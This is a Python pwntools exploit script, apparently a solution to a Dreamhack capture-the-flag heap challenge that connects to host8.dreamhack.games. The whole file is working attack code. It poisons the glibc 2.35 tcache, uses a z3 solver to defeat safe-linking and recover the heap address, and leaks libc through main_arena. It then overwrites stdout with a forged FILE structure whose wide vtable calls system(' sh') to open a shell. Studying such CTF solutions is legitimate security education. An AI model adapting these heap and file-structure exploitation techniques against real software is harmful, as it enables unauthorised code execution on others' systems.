#!/usr/bin/env python3

from pwn import *
from z3 import *

exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main", env={'SHELL': '/bin/bash'})
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214", env={'SHELL': '/bin/bash'})
    else:
        r = remote("host8.dreamhack.games", 22296)

    return r

def get_cat (p, idx):
    p.sendlineafter (b'Enter your choice: ', b'1')
    p.sendlineafter (b'get a cat: ', idx)

def see_cat (p, idx):
    p.sendlineafter (b'Enter your choice: ', b'2')
    p.sendlineafter (b'see a cat: ', idx)

def pet_cat (p, idx, data):
    get_cat (p, idx)
    p.sendlineafter (b'Enter your choice: ', b'3')
    p.sendlineafter (b'pet a cat: ', idx)
    p.sendafter (b'word: ', data)

def repet_cat (p, idx, data):
    p.sendlineafter (b'Enter your choice: ', b'3')
    p.sendlineafter (b'pet a cat: ', idx)
    p.sendafter (b'word: ', data)

def release_cat (p, idx):
    p.sendlineafter (b'Enter your choice: ', b'4')
    p.sendlineafter (b'release a cat: ', idx)

def get_dog (p, idx):
    p.sendlineafter (b'Enter your choice: ', b'5')
    p.sendlineafter (b'get a dog: ', idx)

def see_dog (p, idx):
    p.sendlineafter (b'Enter your choice: ', b'6')
    p.sendlineafter (b'see a dog: ', idx)

def pet_dog (p, idx, data):
    get_dog (p, idx)
    p.sendlineafter (b'Enter your choice: ', b'7')
    p.sendlineafter (b'pet a dog: ', idx)
    p.sendafter (b'word: ', data)

def repet_dog (p, idx, data):
    p.sendlineafter (b'Enter your choice: ', b'7')
    p.sendlineafter (b'pet a dog: ', idx)
    p.sendafter (b'word: ', data)


def release_dog (p, idx):
    p.sendlineafter (b'Enter your choice: ', b'8')
    p.sendlineafter (b'release a dog: ', idx)

def solve_A(x_val, y_val, C_val, bit_size=64):
    A = BitVec('A', bit_size)
    
    x = BitVecVal(x_val, bit_size)
    y = BitVecVal(y_val, bit_size)
    C = BitVecVal(C_val, bit_size)
    
    equation = C == LShR(A + x, 12) ^ (A + y)
    
    s = Solver()
    s.add(equation)
    
    if s.check() == sat:
        model = s.model()
        A_result = model[A].as_long()
        return A_result
    else:
        print("[-] No solution found. Check if the inputs are correct or if the integer sizes differ.")
        return None



def main():
    p = conn()
    pet_cat (p, b'0', b'A' * 8 + b'\x00' * 16 + p64 (0x421))
    pet_cat (p, b'1', b'B' * 8)
    for i in range (3, 7):
        pet_cat (p, str (i).encode('utf-8'), b'A' * 8)

    pet_cat (p, b'7', b'A' * 0x70 + b'\x00' * 8 + p64 (0x21))
    pet_cat (p, b'8', b'A' * 8)
    release_cat (p, b'8')
    pet_cat (p, b'9', b'A' * 8)

    release_cat (p, b'1')
    release_cat (p, b'0')
    pet_cat (p, b'2', b'A' * 8) # 2 head of tcache entry
    release_cat (p, b'0')
    see_cat (p, b'2')
    p.recvuntil (b'A cat says: ')
    leak_heap = u64 (p.recv (8))
    heap_addr = solve_A (0x2a0, 0x340, leak_heap)
    print ("The leak from heap is:", hex (leak_heap))
    print ('The address of heap is', hex (heap_addr))

    pet_dog (p, b'0', b'A' * 8)
    release_dog (p, b'0')

    # 0 - 2, 8 - 9
    
    fake_fd = (heap_addr + 0x2c) >> 12
    fake_fd ^= 0
    repet_cat (p, b'2', p64 (leak_heap) + p64 (0) + p64 (0) + p64 (0x421) + p64 (fake_fd))

    fake_fd = (heap_addr + 0x2a0) >> 12
    fake_fd ^= (heap_addr + 0x2c0)

    repet_cat (p, b'2', p64 (fake_fd))

    pet_cat (p, b'10', b'A' * 8)
    pet_cat (p, b'11', b'A' * 8)
    release_cat (p, b'11')

    see_cat (p, b'2')

    p.recvuntil (b'A' * 8 + p64 (0) * 2 + p64 (0x421))

    main_arena = u64 (p.recv (8)) - 96
    libc.address = main_arena - libc.sym['main_arena']
    print ("The address of main_arena is", hex (main_arena))
    print ("The address of libc is:", hex (libc.address))

    # 7 - 12
    release_cat (p, b'7')
    pet_cat (p, b'12', b'A' * 8)
    release_cat (p, b'7')
    repet_cat (p, b'12', b'A' * 16)
    release_cat (p, b'7')
    fake_fd = (heap_addr + 0x660) >> 12
    fake_fd ^= (heap_addr + 0x7a0)
    repet_cat (p, b'12', p64 (fake_fd))

    pet_cat (p, b'13', b'A' * 8)
    pet_cat (p, b'14', b'A' * 16)

    release_dog (p, b'0')

    fake_fd = (heap_addr + 0x7a0) >> 12
    fake_fd ^= (libc.sym['_IO_2_1_stdout_'])

    repet_cat (p, b'14', p64 (fake_fd))

    pet_dog (p, b'0', b'A' * 8)

    fake_file = libc.sym['_IO_2_1_stdout_']
    payload = flat({
        # fake_file->file._flags
        # requirements:
        # (_flags & 0x0002) == 0
        # (_flags & 0x0008) == 0
        # (_flags & 0x0800) == 0
        # basic approach with spaces:
        # " sh\x00"
        # 0x20, 0x73, 0x68, 0x00
        0x00: b" sh\x00",
        # fake_file->file._wide_data->_IO_write_base
        0x08: p64 (0),
        0x18: p64(0),
        # fake_file->file._IO_write_base
        0x20: p64(0),
        # fake_file->file._IO_write_ptr
        0x28: p64(1),
        # fake_file->file._wide_data->_IO_buf_base
        0x30: p64(0),
        # fake_file->file._wide_data->_wide_vtable->__doallocate
        0x58: libc.symbols["system"],
        # fake_file->file._lock
        0x88: libc.symbols["_IO_stdfile_1_lock"],
        # fake_file->file._wide_data
        0xA0: fake_file - 0x10,
        # fake_file->file._mode
        0xC0: p64(0),
        # fake_file->file._wide_data->_wide_vtable
        0xD0: fake_file - 0x10,
        # fake_file->vtable
        0xD8: libc.symbols["_IO_wfile_jumps"] - 0x20
    })

    pet_dog (p, b'1', payload)

    p.interactive()


if __name__ == "__main__":
    main()
